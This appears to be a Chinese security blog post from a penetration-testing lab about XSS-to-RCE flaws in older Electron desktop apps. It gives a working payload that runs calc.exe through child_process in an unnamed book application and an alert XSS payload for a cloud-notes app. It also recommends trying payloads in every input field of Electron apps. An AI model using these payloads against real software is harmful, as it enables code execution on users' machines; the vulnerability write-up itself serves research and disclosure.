#  有手就能捡到的0day漏洞   
原创 CVES实验室  山海之关   2023-11-25 18:36  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/wzxJic4mN5MOgrDicQSy08LibazicG9pp6p2PRUOfUHm6rMMk8QyhEMlVPHzkXeOoovhaZgY0XOiaSlSZtvGtuiaSVug/640?wx_fmt=jpeg "")  
  
**CVES实验室**  
  
      **“CVES实验室”(www.cves.io)由团队旗下SRC组与渗透组合并而成，专注于漏洞挖掘、渗透测试与情报分析等方向。近年来我们报送漏洞总数已达八万余个，其中包含多个部级单位、多个通信运营商、Apache、Nginx、Thinkphp等，获得CNVD证书、CVE编号数百个，在不同规模的攻防演练活动中获奖无数，协助有关部门破获多起省督级别的案件。**  
  
**前言**  
  
**CFW跑路事件闹得沸沸扬扬，在群里看到有搞安全的小伙伴吐槽了下CFW经常出洞，于是想到了去年那个CFW RCE，那个洞和之前蚁剑RCE一样的，都是基于electron组件的XSS2RCE，原理其实没啥好说的。总结一下就是如果你遇到了gui好看的windows应用，那么只要其功能有框你就插，有参数你就改即可。**  
  
**所以，理论上来讲，只要用了electron（旧版本）组件开发的应用都会存在这个漏洞呢？带着这个疑问，我找到了electron官网的客户案例：**  
```
http://www.electronjs.org/apps
```  
  
**全测是不可能全测的，也没必要全测，也可以通过搜索引擎找到使用了electron组件的国产应用来测。**  
  
**漏洞1-某图书软件**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wzxJic4mN5MP5sQffZYLLa6zqPoHp5V6eogMDsjzYcBPvWDtoB7ZXN7X9EOhFKuk5jnW9okarcicaZf89SKx81zA/640?wx_fmt=png&from=appmsg "")  
  
**xss2rce的payload：**  
```
<img/src="1"/onerror=eval(`require("child_process").exec("calc.exe");`);>
```  
  
**导入以后，直接点击即可触发：**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wzxJic4mN5MP5sQffZYLLa6zqPoHp5V6e36Mg5ZFuJtNQ2kREPHmM6zWlt80ibQeOWvEBAiaHML6rC9wARXMH36xw/640?wx_fmt=png&from=appmsg "")  
  
**漏洞2-某云笔记**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wzxJic4mN5MP5sQffZYLLa6zqPoHp5V6enrShvXHic1Zbknfia7lvFftCHMFzWDU90CLsT8bHIXiblzIZN9tR0N6Cw/640?wx_fmt=png&from=appmsg "")  
  
**xss的payload：**  
```
<img src=x onerror="javascript:alert(/xss/)">
```  
  
**没想到的是移动端也能弹（指定是非electron问题了）：**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wzxJic4mN5MP5sQffZYLLa6zqPoHp5V6eotVPNXHI1ooBC44F63jq27LPXwpewcXKusyyyllW44t4vvqS4eMahA/640?wx_fmt=png&from=appmsg "")  
  
**xss2rce没成功，应该是有沙箱，逆向师傅也没分析出个所以然，所以，到此为止。**  
  
